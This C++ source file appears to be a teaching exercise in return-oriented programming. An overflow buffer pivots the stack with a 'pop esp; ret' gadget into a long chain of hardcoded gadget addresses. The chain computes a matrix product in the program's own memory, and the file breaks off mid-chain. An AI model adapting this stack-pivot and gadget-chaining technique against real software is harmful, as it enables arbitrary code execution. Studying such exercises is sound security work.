// ROPMatrixMult.cpp : Defines the entry point for the console application.
//

#pragma check_stack(off)
#include <string.h>
#include <stdio.h>
#include <cstdlib>
#include <stdlib.h>
#define VARS_SIZE 2048

int vars[VARS_SIZE];

const char newBuff[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	// fill up buffer (16)
						"\x00\x00\x00\x00"								// fill up rest of stack until return address
						"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
						"\xF4\x72\x12\x00"								// 0x001272F4 - &newerStack[0]
						;

void hack(void) {
	printf("Buffer overflowed!\n");
}

void flagBeginGadgets(void) {
	__asm{
		or eax,eax
		or eax,eax
		or eax,eax
	}
}

void flagEndGadgets(void) {
	__asm{
		or ebx,ebx
		or ebx,ebx
		or ebx,ebx
	}
}

void printAnswer(void) {
	int count, size;
	flagEndGadgets();
	size = vars[100];
	for(count = 0; count < size*size; count++) {
		printf("%d\n", vars[400+count]);
	}
	//printf("\nsize = %d\ni = %d\nj = %d\nk = %d\na = %d\nb = %d\nc = %p\nd = %d\ne = %d\nf = %d\ng = %d\nh = %d\nprod[2][2] = %d\n", vars[100], vars[101], vars[102], vars[103], vars[104], vars[105], vars[107], vars[108], vars[109], vars[110], vars[111], vars[112], vars[408]);
	exit(0);
}

void printAddresses(void) {
    printf("Address of hack				= %p\n", hack);
    printf("Address of printAnswer		= %p\n", printAnswer);
    printf("Address of flagBeginGadgets	= %p\n", flagBeginGadgets);
    printf("Address of flagEndGadgets	= %p\n", flagEndGadgets);
	printf("Address of vars			= %p\n", &vars);
	printf("Address of size		    = %p\n", &vars[100]);
	printf("Address of i		    = %p\n", &vars[101]);
	printf("Address of j		    = %p\n", &vars[102]);
	printf("Address of k		    = %p\n", &vars[103]);
	printf("Address of m1[3]		= %p\n", &vars[203]);
	printf("Address of m2[3]		= %p\n", &vars[303]);
	printf("Address of product[3]	= %p\n", &vars[403]);
	printf("Address of newBuff[0]	= %p\n", &newBuff[0]);

	//printf("size_t = %u\n", SIZE_MAX);
	//printf("SIZEOF NEWBUFF = %d\n", sizeof(newbuf)-1);
	printf("\nsize = %d\ni = %d\nj = %d\nk = %d\na = %d\nb = %d\nc = %d\nd = %d\ne = %d\nf = %d\n", vars[100], vars[101], vars[102], vars[103], vars[104], vars[105], vars[107], vars[108], vars[109], vars[110]);
}


void exploit() {
	char newerStack[] =		//"\x00\x10\x40\x00"								// &hack
							"\x20\x10\x40\x00"								// &flagBeginGadgets

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

							// MatrixMult setup

							// i = size - 1
							//	Move size into eax then decrement
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xA8\x41\x40\x00"								// 0x004041A8 - &size
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - dec eax; ret;
							//	Move eax into i
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							
							// j = size - 1
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							//	Move size into eax then decrement
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xA8\x41\x40\x00"								// 0x004041A8 - &size
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - dec eax; ret;
							//	Move eax into i
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB0\x41\x40\x00"								// 0x004041B0 - &j
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

							// k = size - 1
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							//	Move size into eax then decrement
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xA8\x41\x40\x00"								// 0x004041A8 - &size
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - dec eax; ret;
							//	Move eax into i
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

							
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;
							"\x51\xB5\x97\x7C"								// 0x7C97B551 - ret;

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
							// Multiply: a = size * i
							// MultSetup
							// Store inp_b in temp
							//	Move inp_b into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move eax into temp
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC0\x41\x40\x00"								// 0x004041C0 - &temp
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Store inp_b-- into inp_b
							//	Move inp_p into eax then decrement
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN
							//	Move eax into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Store 0 into outp --> Result = 0
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB8\x41\x40\x00"								// 0x004041B8 - &a
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
							// MultCond
							//	if(inp_b<0) set CF by performing c+80000000
							//			Load [inp_b] into eax 
							// -------------------<MultCond stack count = 0> --------------------------------
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							// -------------------<MultCond stack count = 8> --------------------------------
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							// -------------------<MultCond stack count = 15> --------------------------------
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=2;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=4;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=8;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=16;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=32;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=64;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=128;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// -------------------<MultCond stack count = 24> --------------------------------
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	if(n<0) esp=esp+128=esp+4*32;	else if(n>=0) esp=esp; 
							// -------------------<MultCond stack count = 32> --------------------------------
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// -------------------<MultCond stack count = 33> --------------------------------
							// MultLogic
							//  outp (result) = outp (result) + inp_a
							//	Load [inp_a] into eax 
							// -------------------<MultLog stack count = 0> --------------------------------
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xA8\x41\x40\x00"								// 0x004041A8 - &size
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			[b] = [b] + eax
							"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
							"\xB8\x41\x40\x00"								// 0x004041B8 - &a
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret;
							// -------------------<MultLog stack count = 8> --------------------------------
							//  n--
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN 
							//	Store inp_b-- into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// -------------------<MultLog stack count = 20> --------------------------------
							// Loop back to MultCond
							//  esp = esp + CONST 
							"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
							"\x08\xFF\xFF\xFF"								// 0xFFFFFF08 -- amount to inc stack by
									// ^----- Jump amount = (-4)*(MultCond stack count + MultLog stack count) = (-4)*(33+20 + 3??)=-224
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// To account for FibCond adding 32 to esp
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler	
							// Store temp into inp_b
							//	Move temp into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC0\x41\x40\x00"								// 0x004041C0 - &temp
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move eax into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
							// Multiply: b = size * k
							// MultSetup
							// Store inp_b in temp
							//	Move inp_b into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move eax into temp
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC0\x41\x40\x00"								// 0x004041C0 - &temp
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Store inp_b-- into inp_b
							//	Move inp_p into eax then decrement
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN
							//	Move eax into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Store 0 into outp --> Result = 0
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xBC\x41\x40\x00"								// 0x004041BC - &b
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
							// MultCond
							//	if(inp_b<0) set CF by performing c+80000000
							//			Load [inp_b] into eax 
							// -------------------<MultCond stack count = 0> --------------------------------
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							// -------------------<MultCond stack count = 8> --------------------------------
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							// -------------------<MultCond stack count = 15> --------------------------------
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=2;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=4;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=8;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=16;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=32;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=64;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=128;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// -------------------<MultCond stack count = 24> --------------------------------
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	if(n<0) esp=esp+128=esp+4*32;	else if(n>=0) esp=esp; 
							// -------------------<MultCond stack count = 32> --------------------------------
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// -------------------<MultCond stack count = 33> --------------------------------
							// MultLogic
							//  outp (result) = outp (result) + inp_a
							//	Load [inp_a] into eax 
							// -------------------<MultLog stack count = 0> --------------------------------
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xA8\x41\x40\x00"								// 0x004041A8 - &size
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			[b] = [b] + eax
							"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
							"\xBC\x41\x40\x00"								// 0x004041BC - &b
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret;
							// -------------------<MultLog stack count = 8> --------------------------------
							//  n--
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN 
							//	Store inp_b-- into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// -------------------<MultLog stack count = 20> --------------------------------
							// Loop back to MultCond
							//  esp = esp + CONST 
							"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
							"\x08\xFF\xFF\xFF"								// 0xFFFFFF08 -- amount to inc stack by
									// ^----- Jump amount = (-4)*(MultCond stack count + MultLog stack count) = (-4)*(33+20 + 3??)=-224
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// To account for FibCond adding 32 to esp
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler	
							// Store temp into inp_b
							//	Move temp into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC0\x41\x40\x00"								// 0x004041C0 - &temp
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move eax into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
							// g = *(c) = *(&vars[0] + (400 + a + j)<<2)
							//	Move a into eax, then into c
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB8\x41\x40\x00"								// 0x004041B8 - &a
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC4\x41\x40\x00"								// 0x004041C4 - &c
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move 400 into edi, then add to c
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\x90\x01\x00\x00"								// 0x00000190 - imm 400
